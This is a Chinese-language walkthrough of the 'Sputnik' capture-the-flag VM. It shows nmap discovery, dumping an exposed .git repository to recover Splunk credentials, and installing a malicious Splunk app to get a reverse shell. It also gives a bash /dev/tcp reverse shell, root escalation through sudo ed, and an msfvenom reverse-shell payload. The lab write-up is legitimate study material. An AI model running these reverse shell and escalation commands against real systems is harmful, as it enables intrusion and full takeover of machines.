VMware双击打开，nat模式运行即可！

--------------------------------------------
--------------------------------------------
1、nmap 192.168.253.0/24 -sP

Nmap scan report for 192.168.253.252
Host is up (0.00072s latency).

--------------------------------------------
--------------------------------------------
2、nmap -p- 192.168.253.252 -A

8089/tcp  open  ssl/http Splunkd httpd
55555/tcp open  http     Apache httpd 2.4.29 ((Ubuntu))
| http-git: 
|   192.168.253.252:55555/.git/

61337/tcp open  http     Splunkd httpd
| http-robots.txt: 1 disallowed entry

打开了端口 8089、8191、55555 和 61337，端口 55555 具有关联的 IP 地址和 git 存储库的目录链接！

--------------------------------------------
--------------------------------------------
3、git库拖库

访问git：
http://192.168.253.252:55555/.git/

继续访问Logs目录并单击其中的HEAD文件：
http://192.168.253.252:55555/.git/logs/HEAD

有一个Git页面的链接，转到该链接并找到Flappy。
发现：
clone: from https://github.com/ameerpornillos/flappy.git

Git clone用于克隆文件并将其下载到系统以供进一步查看源码分析：
git clone https://github.com/ameerpornillos/flappy
cd flappy
git log   ---克隆了它并浏览了它的历史

git log -p   ---查看每一个源码的详细信息，

sputnik:ameer_says_thank_you_and_good_job

找到对应的一些账号密码信息！

--------------------------------------------
--------------------------------------------
4、Splunkd httpd 反弹shell

splunk：
Splunk 是机器数据的引擎。使用 Splunk 可收集、索引和利用所有应用程序、服务器和设备生成的快速移动型计算机数据 。 使用 Splunking 处理计算机数据，可让您在几分钟内解决问题和调查安全事件。监视您的端对端基础结构，避免服务性能降低或中断。以较低成本满足合规性要求。关联并分析跨越多个系统的复杂事件。获取新层次的运营可见性以及 IT 和业务智能。

https://baike.baidu.com/item/splunk/1679563?fr=aladdin
https://www.splunk.com/zh_cn/resources/machine-learning.html


访问：
http://192.168.253.252:61337

提示：
Splunk管理员为您提供的用户名和密码！

用户名是sputnik，密码是ameer_says_thank_you_and_god_job，输入这些就可以进入Splunk帐户！

sputnik
ameer_says_thank_you_and_good_job


谷歌搜索：
splunk reverse shell
https://github.com/TBGSecurity/splunk_shells
找到了一种使用反向和绑定 shell 来武器化 Splunk 的方法！


下载：
proxychains git clone https://github.com/TBGSecurity/splunk_shells.git

proxychains wget https://github.com/TBGSecurity/splunk_shells/archive/1.2.tar.gz
mv 1.2.tar.gz splunk_shells-1.2.tar.gz


点击右上角：Install app from file 
然后文件上传：splunk_shells-1.2.tar.gz   ---上传一个自定义应用程序
点击： Restart Now
成功后会提示：Restart successful - click OK to log back into Splunk
最后重新登录下：
sputnik
ameer_says_thank_you_and_good_job

登录后查看manager：
Weaponize Splunk for Pentesting and Red Teaming 	splunk_shells-1.2 
在最后一条发现部署上传成功！

点击：Permissions
勾选：All apps
点击：Save保存

文章中提示：https://www.n00py.io/2018/10/popping-shells-on-splunk/
点击左上角Apps：Search & Reporting
输入：| revshell SHELLTYPE ATTACKERIP ATTACKERPORT

本地开启：nc -vlp 8888
| revshell std 192.168.253.138 8888

成功获得反弹shell！


--------------------------------------------
--------------------------------------------
5、信息收集

python -c 'import pty;pty.spawn("/bin/bash")'
获得反弹shell后发现使用该命令无法再执行命令以及无法回显！

需要在谈一次shell：
bash -c "bash -i >& /dev/tcp/192.168.253.138/9999 0>&1"


-r-xr-xr-x 1 splunk splunk  1969904 Mar 25  2019 /opt/splunk/bin/python
-r-xr-xr-x 1 splunk splunk 49293784 Mar 25  2019 /opt/splunk/bin/splunkd

kakeru:x:1000:1000:kakeru:/home/kakeru:/bin/bash
root:x:0:0:root:/root:/bin/bash
splunk:x:1001:1001:Splunk Server:/opt/splunk:/bin/bash

drwxr-xr-x 8 root root 4096 Mar 29  2019 /var/www/html/.git


--------------------------------------------
--------------------------------------------
6、提权

id 
sudo -l 
ameer_says_thank_you_and_good_job 

User splunk may run the following commands on sputnik:
    (root) /bin/ed

https://gtfobins.github.io/#ed


sudo ed
!/bin/sh
成功获得root权限！


--------------------------------------------
--------------------------------------------
7、知识拓展


msfvenom -p cmd/unix/reverse_python lhost=192.168.1.110 lport=4444 R

Splunk初识：（斯普伦克）
https://cloud.tencent.com/developer/article/1614137



































































